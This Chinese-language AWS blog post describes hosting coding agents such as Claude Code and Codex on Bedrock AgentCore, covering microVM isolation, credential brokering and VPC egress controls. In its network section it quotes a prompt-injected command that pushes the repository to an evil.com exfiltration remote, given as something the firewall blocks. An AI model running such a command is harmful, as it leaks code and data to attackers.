# 现在可以安心合上笔记本电脑了：在 Amazon Bedrock AgentCore 上托管编码 agent

一种习惯正在流行。从一个会议走向下一个会议时，半开着笔记本把它抱在怀里。坐在一对一会议里，把盖子撑开恰好让屏幕不熄灭。骑车回家时还端着笔记本，因为它必须保持运行。放在哪里都行，唯独不能合上放在桌上——因为合上放在桌上，会杀死里面正在运行的编码 agent（Claude Code、Codex、Kiro、OpenCode、Gemini CLI、Cursor CLI，或者开发者随手拼起来的任何 harness）。[Business Insider 有一篇文章讲了这件事](https://www.businessinsider.com/coders-keep-laptops-open-in-public-ai-agent-2026-5)。

![](https://d2908q01vomqb2.cloudfront.net/f1f836cb4ea6efb2a0b1b99f41ad8b103eff4b59/2026/06/05/biker_image_higher_resolution-1024x768.png)

把这些 agent 拆开来看，它们都需要同样的五样东西：一个 shell、一个文件系统、检出到本地的项目、安装好的依赖，以及正确的权限（对文件系统进行操作，外加访问网络和外部世界所需的凭证）。你的笔记本恰好五样俱全。但这份清单上没有哪一项写着“笔记本”。笔记本之所以胜出，只是因为它是最顺手的那台机器，而不是正确的那台。

本文余下部分讲的是去伸手拿另一台机器。[Amazon Bedrock AgentCore Runtime](https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/agents-tools-runtime.html) 为每个会话提供专属环境：一个隔离的 Linux microVM，带有持久工作区、真正的 shell 和确定性的命令执行。大多数沙箱产品都能做到类似的事情。更难拼装、而 [AgentCore](https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/what-is-bedrock-agentcore.html) 开箱即用的，是外围系统：一个 [Identity](https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/identity.html) 层，让 agent 以触发它的用户身份行事；一个 [Gateway](https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/gateway.html)，通过单个 Model Context Protocol (MCP) 端点，为 Claude Code、Codex、Kiro 以及其他 harness 提供同一套工具（GitHub、Jira、Slack、你自己的服务），而真实 token 保存在 agent 之外；以及 [Observability](https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/observability.html)，让 agent 的每一步都落入你团队已在使用的 Amazon CloudWatch。然后，盖子就可以合上了。

在本文结束时，我们会把同一个 GitHub issue 同时交给 Claude Code、Codex、Kiro 和 Cursor，让它们各自在自己的环境中处理，并按真正重要的指标给它们打分：延迟、美元成本，以及测试是否一次通过。

## 为什么笔记本不是合适的宿主

在进入正题之前，值得明说为什么笔记本从来就不是这件事的合适宿主。有四条理由格外突出。

- **你的笔记本就是你的受影响区域。** agent 与你共用 shell、文件系统、token、VPN 以及已加载的 SSH 密钥。一个被 prompt 注入的 README，就已经嫌多了。
- **密钥就放在 agent 所编辑代码的旁边。** `.env` 文件、`~/.aws/credentials`、`~/.ssh/id_ed25519`、那个带有私有仓库 token 的 `~/.npmrc`：全都能从 agent 运行所在的同一个 shell 访问到。最小权限原则并没有被遵守。
- **`git worktree` 只是并行化的半成品方案。** 同时运行两个 agent 的标准做法是为两个分支分别创建 worktree，并让每个 agent 指向一个。agent 自身也承担了一部分工作。Codex 默认把沙箱限定在工作目录内。Claude Code 在你另行说明之前是只读的。但它们共用一台机器，而机器正是它们发生冲突的地方：`localhost:5432` 上同一个 Postgres、你的开发服务器都想占用的同一个 `:3000`、同一个 SSH 密钥环、同一个出站 IP、同一个 `~/.aws/credentials`。三个分支上的三个 agent，就是三个进程争夺一台主机。对并行化诚实的答案不是再加一个 worktree，而是每个 agent 一台专属机器。
- **笔记本盖子就是那个终止开关。** 让笔记本休眠，agent 也随之休眠。为了开会合上盖子，会话就丢了。为了坐飞机合上盖子，工作区就丢了。装了一半的依赖、改了一半的重构、还在运行的测试套件，全都随盖子一起消失。任务越长，这笔账越糟：一次 90 分钟的重构或一夜的迁移，意味着盖子必须开 90 分钟，或者开一整夜。交付一个功能不应该取决于笔记本转轴的角度。

## 开发者和平台团队想要什么

如果你是开发者，你想要的是笔记本式的体验，但没有笔记本的限制。同样的 agent、同样的 shell、同样的文件系统、同样即时的反馈，但盖子可以合上，多个 agent 可以并排运行，工作成果能挺过一次重启、一次飞行或一顿漫长的午餐。

如果你在平台团队，你想要的还是那些老要求。每个 agent 都有自己的作用域。流量经由你的虚拟私有云（VPC）流动，而不是公共互联网。身份绑定到公司身份提供商（IdP），而不是 `.env` 文件。每次调用都有 AWS CloudTrail 记录。每一步都有 CloudWatch trace。工具访问由策略层来中介，而不是 `~/.netrc`。凭证不落在由大语言模型（LLM）控制的环境中的磁盘上。这些都不应该是可选项，也都不应该需要自行构建。

我们来看看 AgentCore 如何同时满足这两类需求。

## 带上任何 agent。任选模型。并行运行。

**任何 agent。** 你可以托管 Claude Code、Codex、Kiro、OpenCode、Cursor CLI、Gemini CLI 以及你自己的 harness，并且可以把任何内容打包进容器或 .zip。把容器推送到 Amazon Elastic Container Registry (Amazon ECR)，或直接以 zip 方式部署 [Python](https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/runtime-get-started-toolkit.html) 或 [Node.js](https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/runtime-get-started-code-deploy-node.html) 项目。你可以在镜像中带上自己的依赖：语言运行时、构建工具、git、系统软件包，或者 agent 需要从开发者机器上获得的任何东西。

**任何模型，任何路由。** Runtime 与模型无关。由 harness 选择模型以及到达模型所走的路径。有三种路由，都同样可行：

- **经由 Amazon Bedrock**，它托管 Anthropic 的 Claude 系列，以及最近的 [OpenAI 模型](https://aws.amazon.com/blogs/aws/get-started-with-openai-gpt-5-5-gpt-5-4-models-and-codex-on-amazon-bedrock/)，还有 Nova、Llama、Mistral、Qwen、Kimi 等其他模型。
- **直接经由提供商：** Anthropic 的 Claude API、OpenAI 的 API、Google、其他提供商或自托管模型仍可通过 HTTPS 访问。
- **经由你自己的 LLM gateway**，前提是你已经统一使用某个 gateway 来处理路由、回退和成本控制。

在你的 VPC 内运行 Claude Code 调用 Opus，或运行 Codex 调用 Amazon Bedrock 上的 GPT 级模型。或者让 OpenCode 直接调用 Anthropic 或 OpenAI。又或者让 Kiro 调用你的 gateway 交给它的任何模型。选择适合你安全态势的路由。Runtime 对此没有偏好。Amazon Bedrock 路由有一个特性：prompt、token 和输出都不会离开 AWS 网络。这正是内部安全团队通常会最先问起的特性。

**并行，而不是串行。** 每个会话都运行在自己的 Firecracker microVM 中。几秒钟内就能启动 N 个。让同一个 agent 同时处理十个分支。让三个不同的 agent 处理同一个 ticket，看谁表现更好。对 Claude Code 配 Opus、Codex 配 GPT 级模型、Kiro 配其中任意模型做 A/B 对比：相同的 prompt、相同的仓库、三个独立的内核、三个独立的文件系统，没有 `localhost:5432` 冲突。本文末尾的配套 GitHub 仓库正是把这一场景作为可运行脚本提供。

## 将托管容器变成真正开发环境的四项能力

单单一个托管容器并不是工作站。四项能力让它成为工作站。

### 1. 在停止与恢复之间保持持久的 /mnt/workspace

[托管会话存储（公开预览）](https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/runtime-filesystem-configurations.html)为每个会话提供一个零配置的持久目录。agent 写入文件，下次文件还在。`node_modules`、`.git`、构建缓存、项目文件、改了一半的重构：全都以 agent 离开时的精确状态可用。当 microVM 因空闲而退出时，文件系统会保留。恢复同一个 session ID，一个新的 microVM 会在几毫秒内挂载同一个文件系统。数据在无活动状态下会保留 **14 天**。

```
client.create_agent_runtime(
    agentRuntimeName="acme-coding-agent",
    agentRuntimeArtifact={"containerConfiguration": {"containerUri": "..."}},
    filesystemConfigurations=[
        {"sessionStorage": {"mountPath": "/mnt/workspace"}}
    ],
    roleArn="arn:aws:iam::...:role/AgentExecutionRole",
)
```

就是这样。不需要文件监视器同步到 S3，不需要 `SIGTERM` 刷新逻辑，也不需要 Git bundle 持久化。（各个团队已经反复手工实现过这三样东西。）

在笔记本上工作时，你可以通过 `git worktree`（[参见文档](https://code.claude.com/docs/en/worktrees)）来设置环境，让不同的编码 agent 会话获得逻辑隔离，即分离的工作目录、共享的仓库历史，并希望没有文件冲突。在 AgentCore 上，隔离是物理层面的——你可以让每个 agent 和会话都指向一个隔离的 microVM，以及它自己的 `/mnt/workspace`，同时仍以 git 作为协调层。此外，在 AgentCore 上你自然还能获得彼此分离的构建缓存、独立的 `node_modules`，以及（如有需要）各自独立的文件系统状态。由于 microVM 和文件系统本身提供了额外的隔离，因此不需要管理 worktree。

### 2. 真正的交互式 shell

从 6 月 5 日起，AgentCore Runtime 把[用于终端访问的交互式 shell](https://aws.amazon.com/about-aws/whats-new/2026/06/amazon-bedrock-agentcore-runtime/)引入 agent 会话。`agentcore exec --it` 现在可以直接打开一个由 PTY 支持的 shell，进入正在运行的 microVM。颜色、Tab 补全、Ctrl+C、终端缩放、断网重连，全部内置。运行在远程环境中的编码 harness 开始用起来像你本地的终端。

更有意思的是拥有不止一个 shell 之后能做什么。打开三个终端，分别连接到不同的 microVM，看三个 agent 并行处理三个分支。“后台”不再是你的笔记本，而是一支由远程隔离环境组成的舰队，每个环境都有自己的内核。

而且连接并不娇贵。合上笔记本，明天再打开，重新连上同一个 shell。每个交互式会话都有两个重要的 ID：**runtime session ID**（哪一个 microVM）和 **shell ID**（microVM 内的哪一个 shell）。把两者都传回 `agentcore exec --it`，你就会回到同一个 shell、同一个工作目录、同样的回滚缓冲，无需启动，也无需重新 clone。短暂断网会自动重连。更长时间的断线会打印恢复命令，让你准备好时手动重新连接。

```
# Drop into the agent's VM
agentcore exec --it --runtime acme-coding-agent --session-id sess-jane-1234

# Reconnect to the same shell later
agentcore exec --it --session-id sess-jane-1234 --shell-id shell-789
```

### 3. 从应用层执行确定性的命令

终端并不是驱动环境的唯一方式。凡是能在 `agentcore exec --it` shell 中运行的东西，你的应用也可以直接运行，中间不需要 LLM。harness 完全可以继续决定何时调用 `npm test`、何时 `git push`，大多数时候这没问题。但当操作本身已经是确定性的（运行测试套件、推送分支、安装依赖、获取数据集），你完全可以跳过模型。[InvokeAgentRuntimeCommand](https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/runtime-execute-command.html) 把 shell 命令直接发送到 agent 正在其中工作的 microVM，并通过 HTTP/2 流式返回 stdout/stderr。从 CLI 来看，它与你在交互式 shell 中使用的 `agentcore exec` 相同，只是不带 `--it`：

```
# One-shot, non-interactive
agentcore exec --runtime acme-coding-agent --session-id sess-jane-1234 \
  "cd /mnt/workspace && npm test"
```

不需要把模型放进循环，因此既没有 token 消耗，也不存在关于推送是否发生的概率性判断。agent 一秒前写入的文件，对命令来说立即可见。

### 4. 自带文件系统，用于 skills、缓存和共享产物

托管会话存储覆盖的是单个会话内的持久化。对于*跨*会话和 agent 共享的数据（你团队的 Skills 库、共享依赖缓存、上一套 pipeline 产出的黄金产物），你可以把 [Amazon Simple Storage Service (Amazon S3) Files 或 Amazon Elastic File System (Amazon EFS) 访问点](https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/runtime-filesystem-configurations.html)挂载为每个会话内的 POSIX 目录。每个 runtime 最多五个挂载。不需要 sidecar、挂载辅助程序或 `/etc/fstab`。你可以把一个 Skill 放入 S3 Files，团队中的每个 agent 在下次调用时都会在 `/mnt/skills` 取到它。

```
filesystemConfigurations=[
    {"sessionStorage": {"mountPath": "/mnt/workspace"}},
    {"s3FilesAccessPoint": {"accessPointArn": "...", "mountPath": "/mnt/skills"}},
    {"efsAccessPoint": {"accessPointArn": "...", "mountPath": "/mnt/cache"}},
]
```

## 安全地处理工具与凭证

只能编辑文件的编码 agent 用不了多久。它迟早要发起 pull request、评论 Jira ticket、推送到私有仓库、在 Slack 里呼叫某人。错误的做法是把你的 GitHub 凭证或任何其他访问 token 丢进 microVM 内的 `~/.netrc`，然后指望没人过问。正确的做法是根本不把它放在那里。

[**AgentCore Gateway**](https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/gateway.html) 是工具目录所在之处，而 [**AgentCore Identity**](https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/identity.html) 持有其背后的凭证：长期密钥存放在 AWS Secrets Manager，短期 token 缓存在其 Token Vault 中。你只需注册编码 agent 所需的工具（GitHub、Jira、Slack、你的构建系统、你自己的 OpenAPI 或 AWS Lambda 服务），Gateway 就会暴露一个 MCP 端点，使用 Claude Code、Codex、Cursor、Kiro 和 OpenCode 已在使用的 Streamable HTTP 传输。把 Gateway 接入 harness 只需一行 MCP 配置。无需铸造 bearer 头，也无需粘贴 token：

```
# Claude Code
claude mcp add agentcore \
  https://<gateway-id>.gateway.bedrock-agentcore.us-west-2.amazonaws.com/mcp \
  --transport http
```

```
# Codex CLI ~/.codex/config.toml
[mcp_servers.agentcore]
url = "https://<gateway-id>.gateway.bedrock-agentcore.us-west-2.amazonaws.com/mcp"
```

首次连接时，编码 harness 会发现 Gateway 的认证元数据，然后把开发者重定向到你的 IdP 进行授权（3LO），或者出示 AWS Identity and Access Management (IAM)（M2M），以便 Gateway 认证调用方。此后，每次工具调用都经过 Gateway，Identity 会为正确的调用方附加正确的下游凭证，并缓存起来，使同一个 token 在过期前可跨调用复用。三种模式覆盖了大多数编码工作流。

- **bot 模式，**适用于自主行动的 agent。你创建一个 GitHub bot，铸造一个限定到特定仓库的细粒度个人访问 token（PAT），并在 Gateway 的 GitHub MCP target 上把它注册为 API-key 凭证。Identity 在 Token Vault 中保存该 PAT，Gateway 在每次调用时附加它，因此 GitHub 看到的行为主体就是该 bot。
- **on-behalf-of 模式**，适用于以某个人的身份行动的 agent。开发者通过你的 IdP 登录。Identity 铸造一个 workload 访问 token，并使用 [OAuth 2.0 Token Exchange (RFC 8693)](https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/on-behalf-of-token-exchange.html) 把它换成限定到 GitHub 的 token，把结果缓存在 Token Vault 中，然后 Gateway 在转发每次调用时附加该 token。PR 归属于具体的人，而不是共享的 bot。同一流程也适用于你用同一 IdP 进行认证的任何下游资源，例如 Jira、Slack、Salesforce 或 Confluence。
- **broker 模式**，适用于你希望完全控制凭证流程的情况，例如需要自签名 JWT 的 GitHub App 安装 token，或无法与你的 IdP 联合的下游服务；此时你可以把 Gateway target 指向一个 Lambda。Lambda 在每次调用时铸造或获取凭证，把请求代理到 GitHub，并且绝不把密钥返还给 agent。安全属性与前两种相同，同时为遗留和非标准认证留出空间。

有一项操作是 GitHub MCP server 自身无法完成的：克隆私有仓库。它可以推送文件、发表评论、发起 PR，完成 agent 在会话中途需要的一切，但它没有 clone 动词。最初的拉取仍需经由 git，而 git 需要在会话中有一份凭证。

为了安全地做到这一点，我们建议把该凭证的范围保持得很窄。例如，使用限定为对允许仓库的只读内容权限的细粒度 PAT，或绑定到单个仓库的 deploy key。你把它存放在 Secrets Manager 中，置于 Identity credential provider 之后；会话开始时，runtime 通过 Identity 获取该值，仅用于一次 `git clone`，此后所有其他 GitHub 操作都经由 Gateway。你可以按安全团队要求的任何节奏配置 Secrets Manager 轮换该 token，并随时在 GitHub 上将其吊销。

不过，编码 agent 实际做的大部分事情并不是 MCP 工具调用，而是 `npm install`、`git clone`、`cargo build`、`pip install`。这些是径直与互联网通信的 shell 命令。Gateway 看不到这些流量，底层网络看得到。托管在 AgentCore Runtime 上的 agent 可以运行在你的 VPC 内，这意味着“互联网”在 microVM 内部长什么样由你决定：

- **软件包安装。** agent 运行 `pip install pandas`。你的 Amazon Route 53 私有区域把 `pypi.org` 解析到 VPC 端点后面的内部 PyPI 镜像，或者根本不解析，从而迫使 agent 使用你的 AWS CodeArtifact 仓库。你从没告诉 agent 该用哪个仓库，你只是让它成为从 agent 视角看唯一存在的仓库。
- **Git 操作。** agent 运行 `git push origin main`。你的安全组只允许向 GitHub Enterprise 的 IP 范围发出 443 出站流量，其他一概不允许。一条被注入的 `git remote set-url origin https://evil.com/exfil.git && git push` 会在 TCP 层失败：SYN 包根本无法离开子网。
- **构建工具链。** agent 运行多阶段构建，拉取基础镜像、下载编译器，并从六个不同的仓库获取依赖。你的 NAT 网关的弹性 IP 地址是唯一出口，而 AWS Network Firewall 的域名允许列表就挡在它前面。构建的运行方式与在开发者笔记本上完全一样，只是仅限于你允许的域名。

> 要了解如何控制 agent 可以访问哪些域名，请参阅 Control which domains your AI agents can access。

## Runtime 与 AgentCore 还能带给你什么

关于 Runtime，还有几件值得了解的事：

- **审计与可观测性，从第一天就有。** 每次调用都会记录到 [AWS CloudTrail](https://aws.amazon.com/cloudtrail/)。每个会话都会把 OpenTelemetry trace 发送到 Amazon CloudWatch，并附带会话数、延迟、持续时间、token 用量和错误率等内置指标，这些都能在你团队已在用于其他一切事务的同一个 [CloudWatch GenAI Observability](https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/observability.html) 仪表盘中查看。对于原生不支持 OTel 的工具（例如 [Claude Code](https://code.claude.com/docs/en/monitoring-usage)），你可以把 AWS Distro for OpenTelemetry (ADOT) collector 作为 sidecar 打包进容器，它便能通过 OpenTelemetry Protocol (OTLP) 采集本地 trace，用 SigV4 签名，并转发到 AgentCore Observability 和 AWS X-Ray。
- **与 agent 实际运行方式相符的生命周期。** 每个 microVM 可以运行[最长 8 小时](https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/runtime-lifecycle-settings.html)，也可以只运行一分钟。当会话空闲超过 `idleRuntimeSessionTimeout`（默认 15 分钟，可配置）时，计算资源会自行关闭。如果想更早结束，[StopRuntimeSession](https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/runtime-stop-session.html) 会立刻终止该 microVM。无论哪种方式，`/mnt/workspace`、S3 Files 和 EFS 都保持原样。下次调用同一个 session ID 时，新的 microVM 会挂载同样的文件，agent 从上次中断处继续。你不需要预先选择 CPU 或内存规格：[计费](https://aws.amazon.com/bedrock/agentcore/pricing)跟踪的是实际 CPU 消耗（因此 I/O 等待不产生额外费用）以及截至目前滚动使用的峰值内存。并排运行数百个会话，只需为每个会话实际消耗的资源付费。
- **适配你 VPC 内部的网络。** 选择 VPC 作为网络模式后，agent 会在你的子网内、你的安全组之后运行，可通过你的私有端点访问。S3 Files 和 EFS 通过同一 VPC 内的私有 NFS 挂载。对 IdP、仓库或 Gateway 端点的调用可以全程保持私有。你控制 agent 拥有怎样的网络访问权限、能看到哪些软件包仓库、能推送到哪些 git remote、构建能从哪些域名拉取。超出该范围的任何访问都会在网络层失败，而不是应用层。
- **隔离会话支持高级 agent 模式。** 编码 agent 并不只是一个与远程工具通信的进程。大多数 harness 自带的内置工具（`bash`、`task`、`cron`、`glob`）都在 agent 环境内本地运行，而且大多数都能派生 sub-agent，用于并行研究或把高并发操作与主上下文隔离等目的。在开发者的笔记本上，这一切都堆在同一个 shell 里。在 AgentCore Runtime 上，每个会话都有自己的 microVM，因此内置工具在隔离环境中执行。sub-agent 继承与父级相同的 MCP 配置和环境变量，在自己的上下文中运行，完成后把结果返回主线程。你可以让它们留在前台以便观察，也可以在不需要时推到后台；你还可以把某个特定的 MCP server（或其中的某个特定工具）限定给单个 sub-agent，使其影响范围与其职责相匹配。

## 客户已经在这样做了

许多团队已经在 AgentCore 上把编码 agent 与其他类型的 agent 一起运行。

> Coinbase 的工程经理 Kyle Cesmat 提到：“在 Coinbase，超过 15% 的已合并 PR 归功于云端编码 agent，每天有 1000+ 个云端 agent 运行，以自动化代码库维护、回应产品咨询、扫描安全改进，以及执行更多 agentic 功能。这一切之所以成为可能，是因为我们为 agent 提供了一个云原生环境来运行，与企业笔记本相分离。我们把 Claude Code 和 OpenCode 等编码 agent 托管在 Amazon Bedrock AgentCore Runtime 中，每个会话都会获得一个带有持久工作区的专属 microVM，因此 agent 可以并行运行而不会在同一台主机上冲突，并能从中断处直接恢复。AgentCore 为我们提供了安全、可扩展的基础，让我们的团队得以专注于 agent 工作流本身，而不必构建和运维底层基础设施。”
> Clearwater Analytics 的杰出工程师 Juan Delgado 表示：“在 Clearwater Analytics，把编码 agent 托管在 Amazon Bedrock AgentCore 上，正是让我们能够安全合上笔记本的原因。我们的 Agentic SDLC pipeline 接收产品经理或开发者编写的规格说明，并让它经过一套专门的 agent——包括规格审查、架构、合规、代码生成和代码审查——由一个编排器统一协调。用户或 agent 可以触发该 pipeline，在后台完成从规格到合并请求的全部工作——在推进过程中提出并回答澄清问题，并借助我们代码的精选知识图谱找到要修改和提交的正确文件。人类始终牢牢掌控交付内容；每次变更仍需要工程师审查和批准，这对我们作为一家金融数据公司至关重要。AgentCore 让我们能够把编码 agent 当作真正的生产基础设施，而不是桌面实验，而且它如今正在我们的工程组织中推进真实的工作。”
> Thomson Reuters 的杰出工程师 Danilo Tommasina 表示：“在 Thomson Reuters，我们正在为高要求的法律工作流构建 agentic AI 系统。CoCounsel 结合动态代码生成、可信的专业内容和领域专业知识，帮助客户加快研究、起草和文档分析。CoCounsel AI Assistant Agent 构建在 Claude Agent SDK 之上，运行的是驱动 Claude Code 的同一套执行循环。它托管在 Amazon Bedrock AgentCore 上，为我们提供了在企业规模上支撑这些体验所需的安全、可扩展的执行基础设施，让我们的团队能够专注于为客户构建可靠的、受托级（Fiduciary-Grade）AI 系统。”

不过，我们在本文中讨论的实现模式并不局限于编码 agent。[Iberdrola](https://aws.amazon.com/blogs/machine-learning/iberdrola-enhances-it-operations-using-amazon-bedrock-agentcore/) 的 IT 运维 agent 在自家 VPC 内的 AgentCore 上运行 LangGraph 工作负载，Runtime、Identity、Memory 和 MCP gateway 所起到的作用与编码用例中相同。[Cox Automotive](https://aws.amazon.com/solutions/case-studies/cox-auto-case-study/) 的各团队在一个月内从毫无 agentic 经验做到可投入生产，如今在细粒度的 Identity 管理权限下运行 17 个 agent；用他们自己的话说，构建者可以专注于业务逻辑，而不是基础设施。[Druva 的 DruAI](https://aws.amazon.com/solutions/case-studies/druva-agentcore-case-study/) 在 Runtime 上协调八到十个专门的网络安全 agent，Identity 把每个 agent（data、help、action）限定到各自的后端权限，因此平台团队既能落实边界，又不会拖慢开发者团队。[Kollab](https://aws.amazon.com/cn/blogs/china/on-amazon-bedrock-agentcore-ai-practice/)（中文博客）把团队 AI 工作区托管在 AgentCore Runtime 上，托管会话存储让每个会话的工作目录在暂停期间保持挂载，使下一个 Runtime 实例能精确接续上一个实例的状态，包括会跨每日运行累积状态的定时任务。[Thomson Reuters](https://aws.amazon.com/blogs/machine-learning/how-thomson-reuters-built-an-agentic-platform-engineering-hub-with-amazon-bedrock-agentcore/) 的平台工程团队也在 AgentCore 上构建了一个 agentic hub，用于自动化云账户开通、数据库打补丁和架构审查，并报告首次上线即实现 15 倍生产力提升。问题领域各不相同，但平台带来的收益是一致的。

## 端到端：一支并行工作的 agent 舰队

配套的 GitHub 仓库把本文余下内容变成三个可运行的实验。每个实验的起点都相同：你的应用为每个 agent 调用一次 AgentCore Runtime，每次调用都落在各自的 microVM 中，此后每个 agent 都在自己的项目副本上工作。三者之间的差别在于，agent 运行期间*你*会做些什么。

- **竞速：谁先修好？** 选一个 GitHub issue，同时交给四个 agent，看看谁赢。每个 agent 都在自己的 microVM 中运行。完成后，它们会通过 Gateway 向 GitHub Enterprise 发起 PR。仓库中安排了四个参赛者：Claude Code、Codex CLI、Kiro CLI 和 Cursor CLI。你可以替换其中任何一个，愿最快的正确修复获胜。
- **基准：谁修得最好？** 同样的设置，但脚本不宣布赢家，而是给所有人打分。它把每次运行的延迟、美元成本和测试通过率写入 CSV。你可以为任意多的模型 × harness 组合运行它。下次有人问“哪个模型最适合我们的代码库”，你只需重跑这个脚本。
- **观察：从 agent 肩后看过去。** 一个长时间运行的重构 agent，持续两小时，无人值守地运行。在它工作时，你在本地打开终端，对同一个会话运行 `agentcore exec --it`。此时你已进入与该 agent 相同的 microVM。你可以跟踪日志、阅读堆栈跟踪，或把一条笔记写入文件，让 agent 在下一步开始时重读。无论哪种方式，你都没有进入它的循环。

代码如下所示：

```
AGENTS = {
   "claude-code": {
        "name": "Claude Code",
        "config_dir": os.path.join(AGENTS_DIR, "claude-code"),
        "run_cmd": "/app/run.sh {model_flag}'{prompt}'; exit",
        "default_model": "global.anthropic.claude-opus-4-8", # Opus 4.8
    },
    "kiro": {
        "name": "Kiro",
        "config_dir": os.path.join(AGENTS_DIR, "kiro"),
        "run_cmd": "/app/run.sh {model_flag}chat '{prompt}'; exit",
        "default_model": "auto", # Automatic model option from Kiro
    },
   "codex": {
        "name": "Codex",
        "config_dir": os.path.join(AGENTS_DIR, "codex"),
        "run_cmd": "/app/run.sh {model_flag}'{prompt}'; exit",
        "default_model": "openai.gpt-5.5", # GPT 5.5 
    },
    "hermes": {
        "name": "Hermes",
        "config_dir": os.path.join(AGENTS_DIR, "hermes"),
        "run_cmd": "/app/run.sh {model_flag}'{prompt}'; exit",
        "default_model": "global.meta.llama4-maverick-17b-instruct-v1:0", # Llama model
    }
}
```

然后你可以一次性调用它：

```
client.invoke_agent_runtime_command( 
         agentRuntimeArn=ARN, 
         runtimeSessionId=sid, 
         body={"command": "cd /mnt/workspace && npm test", "timeout": 300}, 
     )
```

或者获得终端交互式体验：

```
client.invoke_agent_runtime_command_shell( 
         agentRuntimeArn=ARN, 
         runtimeSessionId=sid 
     )
```

## 合上笔记本

现在你可以合上盖子了。去吃晚饭、送孩子去踢球，或者睡觉。你启动的 agent 仍在运行，每个都在自己的 microVM 中，每个都在你的平台团队设置的身份与 IAM 控制之下通过 Gateway 调用工具，每一步都被记录到 CloudWatch。明天打开笔记本时，复用相同的 session ID，你就能在每一个 agent 上回到离开时的状态。

半开着笔记本并不是什么炫耀，而是对缺失系统的变通。带上任何编码 agent。带上任何模型。其余的交给 AgentCore。

*现在，把你的笔记本放进包里吧。*
